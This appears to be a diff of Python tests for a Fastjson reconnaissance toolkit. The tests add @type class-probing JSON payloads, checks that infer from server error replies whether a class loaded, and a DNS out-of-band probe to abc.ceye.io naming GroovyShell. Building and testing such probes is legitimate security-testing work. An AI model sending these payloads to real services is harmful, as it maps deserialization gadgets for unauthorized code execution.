@@ -1,8 +1,12 @@
 from fastjson_toolkit.deps.catalog import DepEntry, default_catalog, parse_jar_list_text
 from fastjson_toolkit.deps.probes import (
     character_payload,
+    class_payload,
     dns_locale_payload,
+    response_indicates_character_broken,
     response_indicates_class_absent,
+    response_indicates_class_loaded,
+    response_indicates_class_not_loaded,
     response_indicates_class_present,
 )
 
@@ -35,6 +39,13 @@ def test_character_payload_template():
     assert "${clazz}" not in payload
 
 
+def test_class_payload_template():
+    payload = class_payload("org.apache.commons.io.ByteOrderMark")
+    assert payload == (
+        '{"@type":"java.lang.Class","val":"org.apache.commons.io.ByteOrderMark"}'
+    )
+
+
 def test_dns_locale_payload_template():
     payload = dns_locale_payload("groovy.lang.GroovyShell", "abc.ceye.io")
     assert "groovy.lang.GroovyShell" in payload
@@ -52,6 +63,18 @@ def test_cast_marker_detection():
     assert response_indicates_class_absent("No message available")
     assert response_indicates_class_absent("autoType is not support")
     assert not response_indicates_class_absent("ok")
+    assert response_indicates_character_broken(
+        '{"message":"not close json text, token : }"}'
+    )
+
+
+def test_class_oracle_markers():
+    clazz = "org.apache.commons.io.ByteOrderMark"
+    assert response_indicates_class_loaded(f'"{clazz}"', clazz)
+    assert response_indicates_class_loaded(clazz, clazz)
+    assert response_indicates_class_not_loaded("null", clazz)
+    assert not response_indicates_class_loaded("null", clazz)
+    assert response_indicates_class_not_loaded("", "com.missing.X")
 
 
 def test_explicit_classes_bypass_category_filter():
